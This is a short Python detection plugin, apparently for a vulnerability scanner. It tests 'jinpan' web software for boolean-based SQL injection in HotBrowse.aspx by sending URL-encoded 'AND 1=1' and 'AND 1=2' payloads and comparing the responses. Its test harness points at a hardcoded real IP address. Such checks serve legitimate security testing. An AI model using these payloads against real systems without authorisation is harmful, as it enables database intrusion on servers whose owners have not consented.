#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-062061

def assign(service, arg):
    if service == "jinpan":
        return True, arg
        
        
def audit(arg): 
    payload = 'HotBrowse.aspx?Call=TU'
    getdata1 = '%25%27%20AND%201%3D1%20AND%20%27%25%27%3D%27'
    getdata2 = '%25%27%20AND%201%3D2%20AND%20%27%25%27%3D%27'
    url1 = arg + payload +getdata1
    url2 = arg + payload + getdata2
    code1, head, res1, errcode, _ = curl.curl2(url1)
    code2, head, res2, errcode, _ = curl.curl2(url2)  
    if code1 == 200 and code2 ==200 and  'ASPxGridView1_DXDataRow0' in res1 and 'ASPxGridView1_DXDataRow0' not in res2 :
        security_hole(arg+payload+'   :found sql Injection')


if __name__ == '__main__':
    from dummy import *
    audit(assign('jinpan', 'http://222.77.99.242:8088/')[1])